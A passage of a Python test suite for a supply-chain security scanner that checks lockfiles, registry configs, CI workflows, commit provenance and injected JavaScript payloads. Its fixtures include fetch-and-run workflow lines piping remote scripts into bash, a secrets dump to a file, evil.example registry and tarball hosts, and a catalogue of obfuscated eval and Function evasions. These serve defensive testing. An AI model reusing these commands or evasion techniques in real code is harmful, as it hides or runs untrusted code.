    res = c.run("supply-chain-check", r).expect(0)
    assert "S7" in res.out and "node:20-alpine" in res.out, "S7 report missing"


@case
def supply_lock_resolved_swapped(c):
    r = c.repo({"package-lock.json": npm_lock({"node_modules/x": {"version": "1.0.0", "integrity": INTEG,
                                                                    "resolved": "https://evil.example/x-1.0.0.tgz"}})})
    c.run("supply-chain-check", r).expect(1, has=["S1"])


@case
def supply_lock_missing_integrity(c):
    r = c.repo({"package-lock.json": npm_lock({"node_modules/x": {"version": "1.0.0", "resolved": REG + "x/-/x.tgz"}}),
                "sub/npm-shrinkwrap.json": npm_lock({"node_modules/y": {"version": "1", "integrity": "sha1-AAAA"}})})
    res = c.run("supply-chain-check", r).expect(1, has=["S1"])
    paths = set(p for p, _l in res.at("S1"))
    assert paths == {"package-lock.json", "sub/npm-shrinkwrap.json"}, paths


@case
def supply_lock_links_and_bundles(c):
    lock = npm_lock({"node_modules/ws": {"resolved": "packages/ws", "link": True},
                     "packages/ws": {"name": "ws", "version": "1.0.0"},
                     "node_modules/b/node_modules/inner": {"version": "1.0.0", "inBundle": True},
                     "node_modules/ext": {"resolved": "../outside/pkg", "link": True}})
    res = c.run("supply-chain-check", c.repo({"package-lock.json": lock})).expect(1, has=["S1"])
    assert len(res.at("S1")) == 1, res.at("S1")
    lock = npm_lock({"node_modules/u": {"resolved": "https://evil.example/u.tgz", "link": True},
                     "tools/x": {"name": "x", "resolved": "https://evil.example/x.tgz"}})
    res = c.run("supply-chain-check", c.repo({"package-lock.json": lock})).expect(1, has=["S1"])
    assert len(res.at("S1")) == 2, res.at("S1")


@case
def supply_lock_v1_git_dep(c):
    lock = json.dumps({"lockfileVersion": 1, "dependencies": {
        "ok": {"version": "1.0.0", "resolved": REG + "ok.tgz", "integrity": INTEG},
        "g": {"version": "git+https://github.com/o/r.git#abc", "from": "github:o/r"}}}) + "\n"
    c.run("supply-chain-check", c.repo({"package-lock.json": lock})).expect(1, has=["S1"])


@case
def supply_package_json_specs(c):
    for spec in ("github:o/r", "git+https://x/y.git", "https://x/y.tgz", "o/r#main", "file:../../outside",
                 "link:/abs/path", "git@github.com:o/r.git", "npm:b@https://evil.example/b.tgz"):
        pj = json.dumps({"dependencies": {"x": spec}})
        c.run("supply-chain-check", c.repo({"package.json": pj})).expect(1, has=["S1"], msg=spec)
    for spec in ("^1.2.3", "file:./vendor/x", "workspace:*", "latest", ">=1 <2", "npm:@s/b@^1"):
        pj = json.dumps({"dependencies": {"x": spec}})
        c.run("supply-chain-check", c.repo({"package.json": pj})).expect(0, msg=spec)
    pj = json.dumps({"overrides": {"a": {"b": "github:o/r"}}})
    c.run("supply-chain-check", c.repo({"package.json": pj})).expect(1, has=["S1"])


PNPM_OK = ("lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      ok:\n        specifier: ^1.0.0\n"
           "        version: 1.0.0\n\npackages:\n\n  ok@1.0.0:\n    resolution: {integrity: %s}\n"
           "    engines: {node: '>=18'}\n\n  '@s/x@2.0.0':\n    resolution: {integrity: %s}\n\nsnapshots:\n\n"
           "  ok@1.0.0: {}\n" % (INTEG, INTEG))
PNPM_WS = "packages:\n  - '.'\nallowBuilds:\n  esbuild: true\n"


@case
def supply_pnpm(c):
    c.run("supply-chain-check", c.repo({"pnpm-lock.yaml": PNPM_OK, "pnpm-workspace.yaml": PNPM_WS})).expect(0)
    res = c.run("supply-chain-check", c.repo({"pnpm-lock.yaml": PNPM_OK})).expect(1, has=["S4"], lacks=["S2"])
    pj = json.dumps({"pnpm": {"onlyBuiltDependencies": ["esbuild"]}})
    c.run("supply-chain-check", c.repo({"pnpm-lock.yaml": PNPM_OK, "package.json": pj})).expect(0)
    bads = [
        PNPM_OK.replace("resolution: {integrity: %s}\n    engines" % INTEG,
                        "resolution: {integrity: %s, tarball: https://evil.example/ok.tgz}\n    engines" % INTEG),
        PNPM_OK.replace("resolution: {integrity: %s}\n    engines" % INTEG, "resolution: {tarball: %sok.tgz}\n    engines" % REG),
        PNPM_OK.replace("resolution: {integrity: %s}\n    engines" % INTEG,
                        "resolution: {commit: abc, repo: https://github.com/o/r, type: git}\n    engines"),
        PNPM_OK.replace("resolution: {integrity: %s}\n    engines" % INTEG,
                        "resolution: {directory: ../../elsewhere, type: directory}\n    engines"),
        PNPM_OK.replace("resolution: {integrity: %s}\n    engines" % INTEG,
                        "resolution:\n      integrity: %s\n      tarball: http://evil.example/x.tgz\n    engines" % INTEG),
        PNPM_OK.replace("\nsnapshots:", "\n  evil@1.0.0: {resolution: {tarball: https://evil.example/e.tgz}}\n\nsnapshots:"),
        PNPM_OK.replace("version: 1.0.0\n", "version: link:../../outside\n", 1),
    ]
    for n, lock in enumerate(bads):
        c.run("supply-chain-check", c.repo({"pnpm-lock.yaml": lock, "pnpm-workspace.yaml": PNPM_WS})).expect(
            1, has=["S2"], msg="pnpm variant %d" % n)
    c.run("supply-chain-check", c.repo({"pnpm-lock.yaml": PNPM_OK, "pnpm-workspace.yaml":
                                        "packages: ['.']\ndangerouslyAllowAllBuilds: true\nallowBuilds: {}\n"})).expect(
        1, has=["S4"])
    _ = res


CARGO = ('version = 4\n\n[[package]]\nname = "app"\nversion = "0.1.0"\ndependencies = [\n "serde",\n]\n\n'
         '[[package]]\nname = "serde"\nversion = "1.0.0"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\n'
         'checksum = "%s"\n' % ("ab" * 32))


@case
def supply_cargo(c):
    for env in ({}, {"GUARD_NO_TOMLLIB": "1"}):
        c.run("supply-chain-check", c.repo({"Cargo.lock": CARGO}), env=env).expect(0)
        gitsrc = CARGO + '\n[[package]]\nname = "x"\nversion = "1.0.0"\nsource = "git+https://github.com/o/x?rev=1#abc"\n'
        c.run("supply-chain-check", c.repo({"Cargo.lock": gitsrc}), env=env).expect(1, has=["S3"])
        nock = CARGO.replace('checksum = "%s"\n' % ("ab" * 32), "")
        c.run("supply-chain-check", c.repo({"Cargo.lock": nock}), env=env).expect(1, has=["S3"])
        sparse = CARGO.replace("registry+https://github.com/rust-lang/crates.io-index", "sparse+https://index.crates.io/")
        c.run("supply-chain-check", c.repo({"Cargo.lock": sparse}), env=env).expect(0)
        other = CARGO.replace("registry+https://github.com/rust-lang/crates.io-index", "sparse+https://evil.example/")
        c.run("supply-chain-check", c.repo({"Cargo.lock": other}), env=env).expect(1, has=["S3"])


@case
def supply_install_scripts(c):
    lock = npm_lock({"node_modules/esbuild": {"version": "0.21.5", "resolved": REG + "esbuild/-/e.tgz",
                                              "integrity": INTEG, "hasInstallScript": True},
                     "node_modules/@s/native": {"version": "2.0.0", "resolved": REG + "@s/native/-/n.tgz",
                                                "integrity": INTEG, "hasInstallScript": True}})
    r = c.repo({"package-lock.json": lock})
    res = c.run("supply-chain-check", r).expect(1, has=["S4"])
    assert len(res.at("S4")) == 2
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("S4", "package-lock.json", sha("esbuild"), "native binary download"),
                       ("S4", "package-lock.json", sha("@s/native"), "node-gyp build")))
    c.git(r, "add", "-A")
    c.run("supply-chain-check", r).expect(0)
    with open(os.path.join(r, "package-lock.json"), "w") as fh:
        fh.write(lock.replace("0.21.5", "0.25.0"))
    c.run("supply-chain-check", r).expect(0, msg="version bump keeps the name allowlisted")


@case
def supply_registry_config(c):
    bad = {".npmrc": "registry=https://evil.example/\n", "a/.npmrc": "@corp:registry=https://npm.corp.example/\n",
           "b/.npmrc": "ignore-scripts=false\n", ".pnpmfile.cjs": "module.exports = { hooks: {} };\n",
           "c/.yarnrc.yml": "npmRegistryServer: \"https://evil.example\"\n", "d/.yarnrc": 'registry "https://evil.example/"\n',
           "e/bunfig.toml": '[install]\nregistry = "https://evil.example/"\n'}
    for path, content in bad.items():
        c.run("supply-chain-check", c.repo({path: content})).expect(1, has=["S5"], msg=path)
    ok = {".npmrc": "registry = \"https://registry.npmjs.org/\"\nlegacy-peer-deps=true\n//registry.npmjs.org/:_authToken=${T}\n",
          ".yarnrc.yml": "npmRegistryServer: https://registry.npmjs.org\n"}
    c.run("supply-chain-check", c.repo(ok)).expect(0)


@case
def supply_workflow_curl_bash(c):
    wf = GOOD_WF + "      - run: curl -fsSL https://get.example.dev | bash\n"
    res = c.run("supply-chain-check", c.repo({".github/workflows/ci.yml": wf})).expect(1, has=["S6"])
    assert res.at("S6") == [(".github/workflows/ci.yml", 16)], res.at("S6")


@case
def supply_workflow_patterns(c):
    variants = [
        "      - uses: actions/checkout@v4\n",
        "      - uses: \"actions/setup-node@v4.0.2\"\n",
        "      - {uses: pnpm/action-setup@v4, with: {version: 10}}\n",
        "      - uses: docker://alpine:3.20\n",
        "      - run: echo aGk= | base64 -d | sh\n",
        "      - run: |\n          wget -qO- https://x.example/i.sh \\\n            | sudo -E bash -s\n",
        "      - run: bash <(curl -s https://x.example/i.sh)\n",
        "      - run: echo '${{ toJSON(secrets) }}' > s.json\n",
        "      - run: echo \"token ${{ secrets.NPM_TOKEN }}\"\n",
        "permissions: write-all\n",
        "on:\n  pull_request_target:\n",
        "      - uses: org/repo/.github/workflows/w.yml@main\n",
    ]
    for v in variants:
        c.run("supply-chain-check", c.repo({".github/workflows/ci.yml": GOOD_WF + v})).expect(1, has=["S6"], msg=v.strip())
    ok = GOOD_WF + ("      - uses: docker://alpine@sha256:%s\n      - run: curl -fsSL https://x.example/a.tgz -o a.tgz\n"
                    "      - run: echo 'uses actions' # uses: not/a@ref\n      - run: echo ${{ github.sha }} | sha256sum\n"
                    % ("c" * 64))
    c.run("supply-chain-check", c.repo({".github/workflows/ci.yml": ok})).expect(0)


@case
def supply_action_yml_allowlist_rules(c):
    act = "runs:\n  using: composite\n  steps:\n    - uses: actions/cache@v4\n"
    r = c.repo({".github/actions/setup/action.yml": act})
    c.run("supply-chain-check", r).expect(1, has=["S6"])
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("S6", ".github/actions/setup/action.yml", sha("actions/cache@v4"), "pin pending")))
    c.git(r, "add", "-A")
    c.run("supply-chain-check", r).expect(0)
    r2 = c.repo({".github/workflows/ci.yml": GOOD_WF + "      - uses: actions/cache@v4\n",
                 ".supply-chain-guard.allow": allow(("S6", ".github/workflows/ci.yml", sha("actions/cache@v4"), "no"))})
    c.run("supply-chain-check", r2).expect(1, has=["S6", "AL"])


# ---------------------------------------------------------------------------
# commit-provenance
# ---------------------------------------------------------------------------
HUMAN = "Dev <dev@example.com> 1727690000 +0200"
GH = "GitHub <noreply@github.com> 1727690000 +0000"
BOT = "dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com> 1727690000 +0000"


def mk_commit(c, r, tree, parents, author, committer, msg, sig=False):
    lines = ["tree " + tree] + ["parent " + p for p in parents] + ["author " + author, "committer " + committer]
    if sig:
        lines += ["gpgsig -----BEGIN PGP SIGNATURE-----", " ", " wsBcBAABCAAQBQJm", " -----END PGP SIGNATURE-----"]
    body = ("\n".join(lines) + "\n\n" + msg).encode()
    return c.git(r, "hash-object", "-t", "commit", "-w", "--stdin", input=body)


def tree_of(c, r, files):
    for rel, content in files.items():
        with open(os.path.join(r, rel), "w") as fh:
            fh.write(content)
    c.git(r, "add", "-A")
    return c.git(r, "write-tree")


def api_fixture(c, slug, commits):
    base = c.path("api")
    d = os.path.join(base, "repos", slug, "commits")
    os.makedirs(d, exist_ok=True)
    for s, doc in commits.items():
        with open(os.path.join(d, s), "w") as fh:
            json.dump(doc, fh)
    return {"GUARD_GITHUB_API": "file://" + base, "GITHUB_REPOSITORY": slug}


@case
def provenance_merge_parents(c):
    r = c.repo({"f": "1\n"})
    t = c.git(r, "write-tree")
    root = mk_commit(c, r, t, [], HUMAN, HUMAN, "root\n")
    side = mk_commit(c, r, t, [root], HUMAN, HUMAN, "side\n")
    fake = mk_commit(c, r, t, [root], HUMAN, HUMAN, "Merge pull request #12 from o/feature\n")
    real = mk_commit(c, r, t, [root, side], HUMAN, HUMAN, "Merge branch 'feature'\n")
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, fake)).expect(1, has=["C1"])
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, real)).expect(0)


@case
def provenance_github_committer_signatures(c):
    r = c.repo({"f": "1\n"})
    t = c.git(r, "write-tree")
    root = mk_commit(c, r, t, [], HUMAN, HUMAN, "root\n")
    unsigned = mk_commit(c, r, t, [root], HUMAN, GH, "Update README.md\n")
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, unsigned)).expect(1, has=["C2"])
    bot = mk_commit(c, r, t, [root], BOT, BOT, "Bump x from 1 to 2\n")
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, bot)).expect(1, has=["C2"])
    signed = mk_commit(c, r, t, [root], HUMAN, GH, "Update docs\n", sig=True)
    env = api_fixture(c, "o/r", {signed: {"sha": signed, "commit": {"verification": {"verified": True, "reason": "valid"}}}})
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, signed), env=env).expect(0)
    bad = mk_commit(c, r, t, [root], HUMAN, GH, "Update docs 2\n", sig=True)
    env = api_fixture(c, "o/r", {bad: {"sha": bad, "commit": {"verification": {"verified": False, "reason": "invalid"}}}})
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, bad), env=env).expect(1, has=["C2"])
    gone = mk_commit(c, r, t, [root], HUMAN, GH, "Update docs 3\n", sig=True)
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, gone), env=env).expect(2)
    human = mk_commit(c, r, t, [root], HUMAN, HUMAN, "work\n")
    c.run("commit-provenance", r, "--range", "%s..%s" % (root, human)).expect(0)


@case
def provenance_forged_replica_force_push(c):
    r = c.repo({"f": "1\n"})
    t1 = c.git(r, "write-tree")
    t2 = tree_of(c, r, {"f": "2\n"})
    root = mk_commit(c, r, t1, [], HUMAN, HUMAN, "root\n")
    old = mk_commit(c, r, t1, [root], HUMAN, GH, "Release 1.2.3\n", sig=True)
    replica = mk_commit(c, r, t2, [root], HUMAN, GH, "Release 1.2.3\n\n")
    c.git(r, "update-ref", "refs/heads/feature", replica)
    res = c.run("commit-provenance", r, "--push", "--before", old, "--after", replica, "--ref",
                "refs/heads/feature", "--forced").expect(1, has=["C3", "C2"])
    honest = mk_commit(c, r, t2, [root], HUMAN, HUMAN, "Release 1.2.3 (fixed)\n")
    c.run("commit-provenance", r, "--push", "--before", old, "--after", honest, "--ref", "refs/heads/feature",
          "--forced").expect(0)
    c.run("commit-provenance", r, "--push", "--before", old, "--after", honest, "--ref", "refs/heads/main",
          "--forced").expect(1, has=["C3"])
    # old tip only known to the API (unreachable after the force push)
    r2 = c.repo({"f": "2\n"})
    t2b = c.git(r2, "write-tree")
    root2 = mk_commit(c, r2, t2b, [], HUMAN, HUMAN, "root\n")
    rep2 = mk_commit(c, r2, t2b, [root2], HUMAN, HUMAN, "feat: x\n")
    old_sha = "1" * 40
    env = api_fixture(c, "o/r2", {old_sha: {"sha": old_sha, "parents": [{"sha": root2}], "commit": {
        "tree": {"sha": "2" * 40}, "message": "feat: x",
        "author": {"name": "Dev", "email": "dev@example.com", "date": "2024-09-30T09:53:20Z"},
        "committer": {"name": "Dev", "email": "dev@example.com", "date": "2024-09-30T09:53:20Z"}}}})
    c.run("commit-provenance", r2, "--push", "--before", old_sha, "--after", rep2, "--ref", "refs/heads/x",
          "--forced", env=env).expect(1, has=["C3"])
    _ = res


@case
def provenance_event_and_shallow(c):
    r = c.repo({"f": "1\n"}, commit=True)
    head = c.git(r, "rev-parse", "HEAD")
    ev = c.path("event.json")
    with open(ev, "w") as fh:
        json.dump({"before": "0" * 40, "after": head, "ref": "refs/heads/feature", "forced": False}, fh)
    c.run("commit-provenance", r, "--event", env={"GITHUB_EVENT_NAME": "push", "GITHUB_EVENT_PATH": ev}).expect(0)
    c.run("commit-provenance", r, "--event", env={"GITHUB_EVENT_NAME": "schedule", "GITHUB_EVENT_PATH": ev}).expect(2)
    shallow = c.path("shallow")
    c.git(r, "clone", "-q", "--depth", "1", "file://" + r, shallow)
    c.run("commit-provenance", shallow, "--range", "%s..%s" % (head, head)).expect(2)


# ---------------------------------------------------------------------------
# action orchestrator (bin/guard-ci) as action.yml runs it
# ---------------------------------------------------------------------------
@case
def ci_orchestrator(c):
    r = c.repo({"src/a.js": J(EV, "(x);\n"), ".github/workflows/ci.yml": GOOD_WF}, commit=True)
    summ = c.path("summary.md")
    env = {"GITHUB_WORKSPACE": r, "GITHUB_STEP_SUMMARY": summ, "GUARD_MODE": "full", "GUARD_CHECKS": "all"}
    res = c.run("guard-ci", r, env=env)
    assert res.rc == 1, res.out[-800:]
    assert "::error file=src/a.js,line=1,col=1,title=P4" in res.out, res.out[-800:]
    assert "::stop-commands::" in res.out
    with open(summ) as fh:
        s = fh.read()
    assert "| P4 |" in s and "FINDINGS" in s, s
    r2 = c.repo({"README.md": "# ok\n", ".github/workflows/ci.yml": GOOD_WF}, commit=True)
    head = c.git(r2, "rev-parse", "HEAD")
    ev = c.path("push.json")
    with open(ev, "w") as fh:
        json.dump({"before": "0" * 40, "after": head, "ref": "refs/heads/feature", "forced": False}, fh)
    env2 = {"GITHUB_WORKSPACE": r2, "GITHUB_STEP_SUMMARY": c.path("s2.md"), "GITHUB_EVENT_NAME": "push",
            "GITHUB_EVENT_PATH": ev, "GITHUB_REPOSITORY": "o/r"}
    res2 = c.run("guard-ci", r2, env=env2)
    assert res2.rc == 0, res2.out[-1500:]
    res3 = c.run("guard-ci", r2, env={"GITHUB_WORKSPACE": r2, "GUARD_CHECKS": "P1,bogus", "GUARD_MODE": "full"})
    assert res3.rc == 2, res3.out[-500:]
    res4 = c.run("guard-ci", r2, env={"GITHUB_WORKSPACE": c.path("nowhere"), "GUARD_MODE": "full"})
    assert res4.rc == 2, res4.out[-500:]


# ---------------------------------------------------------------------------
# round 2 regressions
# ---------------------------------------------------------------------------
# (1) the legacy in-repo scanner greps for a campaign signature as a literal: P1, no path exemption;
#     the adoption PR deletes it (tools/adoption-precheck lists it and every step that runs it)
LEGACY_LINE = J("  -F -e '_$", "_d692' -e '_$", "jsoToArr' -- \"${EXCLUDES[@]}\"")
LEGACY_FRAG = J("  -F -e '_$", "_d692' -e '_$", "''jsoToArr' -- \"${EXCLUDES[@]}\"")
LEGACY_SH = "#!/usr/bin/env bash\nset -eu\nhits=$(git grep -n -I \\\n" + LEGACY_LINE + ")\n"
LEGACY_TEST_SH = "#!/usr/bin/env bash\nbash scripts/scan-injected-" + "payload.sh\n"


@case
def rollout_legacy_scanner_is_p1_with_no_path_exemption(c):
    for path in ("scripts/scan-injected-" + "payload.sh", "tools/check.sh", "ci/scan.sh", "docs/scanner.md"):
        res = c.run("scan-payload", c.repo({path: LEGACY_SH, "README.md": "# x\n"})).expect(1, has=["P1"], msg=path)
        hits = [f for f in res.findings if f["check"] == "P1"]
        assert [f["path"] for f in hits] == [path] and not hits[0]["allowlistable"], hits
    r = c.repo({"scripts/scan-injected-" + "payload.sh": LEGACY_SH})
    res = c.run("scan-payload", r).expect(1, has=["P1"])
    assert "adoption PR" in res.out and "not allowlistable" in res.out, res.out[-600:]
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("P1", "scripts/scan-injected-" + "payload.sh", sha(LEGACY_LINE), "legacy scanner")))
    c.git(r, "add", "-A")
    c.run("scan-payload", r).expect(1, has=["P1", "AL"], msg="P1 allowlist entry must be refused")
    # rewritten as fragments, the same grep is no longer a literal signature
    c.run("scan-payload", c.repo({"scripts/scan-injected-" + "payload.sh": LEGACY_SH.replace(LEGACY_LINE, LEGACY_FRAG)})
          ).expect(0)


def _legacy_consumer(c, commit=True):
    files = {"scripts/scan-injected-" + "payload.sh": LEGACY_SH,
             "scripts/scan-injected-" + "payload.test.sh": LEGACY_TEST_SH,
             ".github/workflows/security-scan.yml": GOOD_WF + "      - run: bash scripts/scan-injected-" + "payload.test.sh\n"
             "      - run: bash scripts/scan-injected-" + "payload.sh\n",
             "amplify.yml": ("version: 1\nfrontend:\n  phases:\n    preBuild:\n      commands:\n"
                             "        - bash scripts/scan-injected-" + "payload.sh\n        - npm ci\n"),
             "package.json": '{"name":"x","scripts":{"scan":"bash scripts/scan-injected-' + 'payload.sh"}}\n',
             "src/a.js": J(EV, "(x);\n")}
    return c.repo(files, commit=commit)


@case
def rollout_adoption_precheck_lists_legacy_files_and_steps(c):
    r = _legacy_consumer(c)
    jp, dp = c.path("pre.json"), c.path("draft.allow")
    rc, out = c.run_raw("tools/adoption-precheck", "--repo-dir", r, "--json", jp, "--allow-draft", dp)
    assert rc == 1, out[-1500:]
    with open(jp) as fh:
        doc = json.load(fh)[0]
    assert sorted(doc["legacy_files"]) == ["scripts/scan-injected-" + "payload.sh",
                                           "scripts/scan-injected-" + "payload.test.sh"], doc["legacy_files"]
    kinds = sorted(set(x["kind"] for x in doc["references"]))
    assert kinds == ["amplify build command", "package.json script", "workflow step"], kinds
    p1 = [d for d in doc["findings_in_legacy_files"] if d["check"] == "P1"]
    assert p1 and p1[0]["fragment_hint"] == J("_$", "''jsoToArr"), p1
    assert [d["check"] for d in doc["allowlistable"]] == ["P4"], doc["allowlistable"]
    assert doc["must_fix"] == [], doc["must_fix"]
    assert "ADOPTION WORK REQUIRED" in out and "delete in the adoption PR" in out
    with open(dp) as fh:
        draft = fh.read()
    assert all(l.startswith("#") for l in draft.splitlines() if l.strip()), "draft entries must stay commented out"
    # the adoption PR: legacy files gone, steps replaced by the local copy, the legit eval allowlisted
    for f in ("scripts/scan-injected-" + "payload.sh", "scripts/scan-injected-" + "payload.test.sh"):
        os.remove(os.path.join(r, f))
    with open(os.path.join(r, ".github/workflows/security-scan.yml"), "w") as fh:
        fh.write(GOOD_WF)
    with open(os.path.join(r, "amplify.yml"), "w") as fh:
        fh.write("version: 1\nfrontend:\n  phases:\n    preBuild:\n      commands:\n"
                 "        - bash .supply-chain-guard/bin/scan-payload\n        - npm ci\n")
    with open(os.path.join(r, "package.json"), "w") as fh:
        fh.write('{"name":"x","scripts":{"build":"tsc"}}\n')
    with open(os.path.join(r, ".supply-chain-guard.allow"), "w") as fh:
        fh.write(allow(("P4", "src/a.js", doc["allowlistable"][0]["fingerprint"], "reviewed: test helper")))
    c.git(r, "add", "-A")
    rc, out = c.run_raw("tools/adoption-precheck", "--repo-dir", r)
    assert rc == 0 and "verdict: READY" in out, out[-1500:]
    c.run("scan-payload", r).expect(0)


@case
def rollout_adoption_precheck_workflow_findings_are_must_fix(c):
    r = c.repo({".github/workflows/ci.yml": GOOD_WF + "      - uses: actions/cache@v4\n",
                ".github/actions/setup/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: actions/cache@v4\n"},
               commit=True)
    jp = c.path("wf.json")
    rc, out = c.run_raw("tools/adoption-precheck", "--repo-dir", r, "--json", jp)
    assert rc == 1, out[-800:]
    with open(jp) as fh:
        doc = json.load(fh)[0]
    assert [d["path"] for d in doc["must_fix"]] == [".github/workflows/ci.yml"], doc["must_fix"]
    assert [d["path"] for d in doc["allowlistable"]] == [".github/actions/setup/action.yml"], doc["allowlistable"]


@case
def rollout_adoption_precheck_mirror_heads(c):
    r = _legacy_consumer(c)
    c.git(r, "branch", "stage")
    bare = c.path("consumer.git")
    c.git(r, "clone", "-q", "--bare", r, bare)
    work = c.path("work")
    os.makedirs(work)
    rc, out = c.run_raw("tools/adoption-precheck", "--mirror", bare, "--refs", "main,stage,prod", "--work", work)
    assert rc == 1, out[-1500:]
    assert out.count("scripts/scan-injected-" + "payload.sh  [") == 2, out
    assert "skipped: no branch prod" in out, out
    assert os.listdir(work) == [], "temporary worktrees left behind: %r" % os.listdir(work)
    assert "precheck-" not in c.git(bare, "worktree", "list")
    rc, out = c.run_raw("tools/adoption-precheck", "--mirror", bare)
    assert rc == 2 and "COULD NOT CHECK" in out, out


# (2)(3) executors hidden by ordinary JS indirection, in the exact files the campaign rewrites
CAMPAIGN_TARGETS = ("packages/playwright-analytics/scripts/postinstall.cjs", "packages/mcp/scripts/mirror-skills.js",
                    "studio-vscode/extension/esbuild.mjs", "postcss.config.mjs", "scripts/typecheck-gate.mjs",
                    "server/src/db/migrate.ts", "packages/mcp/src/cli.ts", "tests/unit/authorize.test.ts")
HIDDEN_EXECUTORS = [
    J("globalThis['", EV, "'](s);"), J("window['", EV, "'](s);"), J("self[\"", EV, "\"](s);"),
    J("global['", EV, "'](s);"), J("globalThis['", FN, "'](s)();"), J("globalThis[`", EV, "`](s);"),
    J("globalThis?.['", EV, "'](s);"), J("(0, ", EV, ")(s);"), J("(0,", EV, ")(s);"),
    J("[].constructor.constr", "uctor(\"console.log(1)\")();"), J("const k = 'ev' + 'al';\nglobalThis[k](s);"),
    J("Reflect.get(globalThis, '", EV, "')(s);"), J("this[String.fromChar", "Code(101, 118, 97, 108)](s);"),
    J("const o = {r: globalThis.", EV, "};\no.r(s);"), J("(function () { return this })()['", EV, "'](s);"),
    J("const s2 = s;\n", EV, "\n(s2);"), J("globalThis['\\x65val'](s);"), J("globalThis['ev\\u0061l'](s);"),
    J("const k = ['ev', 'al'].join('');"), J("const k = 'lave'.split('').reverse().join('');"),
    J("const k = String.fromChar", "Code(101, 118, 97, 108);"), J(FN, "`return 1`();"),
    J("const cp = require('child_' + 'process');"), J("new Worker(code, { ", EV, ": true });"),
    J("spawn(process.execPath, ['-e', code]);"), J("const F = (async () => {}).constr", "uctor;"),
    J("window[name](s);"), J("const u = 'data:text/javascript,1';\nimport(u);"),
]


@case
def p4_hidden_executors_in_campaign_targets(c):
    # one file per (target, evasion); the target's own name and extension, under its own directory
    files, want = {}, {}
    for t, path in enumerate(CAMPAIGN_TARGETS):
        for e, ex in enumerate(HIDDEN_EXECUTORS):
            p = "v%02d%02d/%s" % (t, e, path)
            files[p] = "export const config = { a: 1 };\nconst s = load();\n" + ex + "\n"
            want[p] = ex
    res = c.run("scan-payload", c.repo(files), "--checks", "P4").expect(1, has=["P4"])
    got = set(p for p, _l in res.at("P4"))
    missed = sorted("%s: %s" % (p, want[p]) for p in want if p not in got)
    assert not missed, "evasions not caught:\n  " + "\n  ".join(missed[:20])
    for f in res.findings:
        assert f["line"] >= 3, "P4 on the clean prologue: %r" % f


@case
def p4_quoted_global_member_is_the_first_fix(c):
    files = {}
    for obj in ("globalThis", "window", "self", "global"):
        for name in (EV, FN):
            for q in ("'", '"', "`"):
                files["m/%s-%s-%d.js" % (obj, name, ord(q))] = J("const s = x;\n", obj, "[", q, name, q, "](s);\n")
        files["d/%s.js" % obj] = J(obj, "['", AT, "'](x);\n")
    res = c.run("scan-payload", c.repo(files)).expect(1, has=["P4", "P5"])
    p4 = res.at("P4")
    assert sorted(p4) == sorted((p, 2) for p in files if p.startswith("m/")), p4
    assert sorted(p for p, _l in res.at("P5")) == sorted(p for p in files if p.startswith("d/")), res.at("P5")
    # not member access / not an executor: array literals, object keys, string values
    clean = J("const s = { surfaces: ['", EV, "'], type: '", EV, "', ", EV, ": true };\n",
              "expect(fn).toBeInstanceOf(", FN, ");\nconst t = typeof x === 'function';\n",
              "const label = cache[keys.join(',')];\n")
    c.run("scan-payload", c.repo({"src/a.ts": clean})).expect(0)


@case
def p4_prose_comments_and_their_traps(c):
    prose = J("// Text-to-Image ", EV, " (Augur) tools\n/** platform: web, api, ", EV, " (LLM evaluation) */\n",
              "// CloudFront ", FN, " (runtime 2.0)\nexport const x = 1;\n")
    c.run("scan-payload", c.repo({"src/a.ts": prose})).expect(0)
    traps = [J("// {", EV, "(s)}"), J("/* a */ ", EV, "(s);"), J("// x */ ", EV, "(s);"), J("// ${", EV, "(s)}"),
             J(" * ", EV, "(s)")]
    files = dict(("src/t%d.jsx" % i, "const a = 1;\n" + t + "\n") for i, t in enumerate(traps))
    res = c.run("scan-payload", c.repo(files)).expect(1, has=["P4"])
    assert sorted(res.at("P4")) == sorted((p, 2) for p in files), res.at("P4")


# (4) decoders flagged on their own: no P4 executor needed
DECODERS = [J("const s = ", AT, "(d);"), "const s = Buffer.from(d, 'hex').toString();",
            "const s = Buffer.from(d, 'latin1').toString();", "const s = Buffer.from(d, 'base64url').toString();",
            J("const s = String.fromCode", "Point(...d);"), J("const s = d.map((c) => String.fromChar", "Code(c)).join('');"),
            "const s = new TextDecoder().decode(d);", "const s = unescape(d);", "const s = Uint8Array.fromBase64(d);"]


@case
def p5_decoder_without_any_executor(c):
    # build/install/config-time files: any decoder, no executor needed. Each (path, decoder) pair
    # lives under its own vNN/ directory with its own package.json (for the script-target case).
    paths = ("postcss.config.mjs", "scripts/x.mjs", "packages/a/scripts/postinstall.cjs", "esbuild.mjs",
             "server/src/db/migrate.ts", "server/src/db/seed.ts", "src/gen/run.ts", "studio-vscode/extension/esbuild.mjs")
    files = {}
    for i, path in enumerate(paths):
        for j, d in enumerate(DECODERS):
            pre = "v%02d%02d/" % (i, j)
            files[pre + path] = "const d = read();\n" + d + "\nexport default s;\n"
            files[pre + "package.json"] = '{"name":"x","scripts":{"gen":"tsx src/gen/run.ts"}}\n'
    res = c.run("scan-payload", c.repo(files), "--checks", "P4,P5").expect(1, has=["P5"], lacks=["P4"])
    want = sorted((p, 2) for p in files if not p.endswith("package.json"))
    assert sorted(res.at("P5")) == want, sorted(set(want) - set(res.at("P5")))[:10]
    c.run("scan-payload", c.repo({"build.mjs": DECODERS[1] + "\n"}), "--checks", "P5").expect(1, has=["P5"])
    # runtime code decoding data it is handed stays clean (a large application can have ~100 such lines),
    # and so do encoders, char constants and test-runner setup files
    files = dict(("server/src/services/auth%d.ts" % j, "const d = read();\n" + d + "\n") for j, d in enumerate(DECODERS))
    files["scripts/enc.mjs"] = "const b64 = Buffer.from(x).toString('base64');\n"
